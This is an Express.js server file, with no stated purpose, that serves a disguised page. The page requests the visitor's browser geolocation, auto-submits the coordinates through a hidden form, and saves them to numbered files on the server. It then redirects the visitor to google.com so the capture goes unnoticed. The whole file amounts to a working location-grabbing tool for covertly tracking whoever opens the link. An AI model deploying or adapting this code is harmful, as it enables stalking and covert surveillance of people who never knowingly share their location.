const express = require('express');
const app = express();

const bodyParser = require('body-parser');

const fs = require('fs');


app.use(bodyParser());
app.use(bodyParser.urlencoded({extended:false}));


app.get('/', (req, res) => {
    res.send(
`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>page</title>
</head>
<body>
    <form method="POST" action="/save" id="data" name="data">
        <input name="location" id="location" value="">
    </form>
    <script>
        navigator.geolocation.getCurrentPosition(function(pos) {
            var latitude = pos.coords.latitude;
            var longitude = pos.coords.longitude;

            document.getElementById('location').value = String(latitude) + ' ' + String(longitude);
            document.getElementById('data').submit();

            console.log(latitude, longitude)
        });

    </script>
</body>
</html>
`
    );
});

app.post('/save', (req, res) => {
    console.log(req.body)
    let location = req.body.location;
    let num = fs.readdirSync('./data').length;

    fs.writeFileSync(`./data/${num}`, String(location));
    res.redirect('https://google.com');
});

app.listen(4000, () => {
    console.log('listening');
});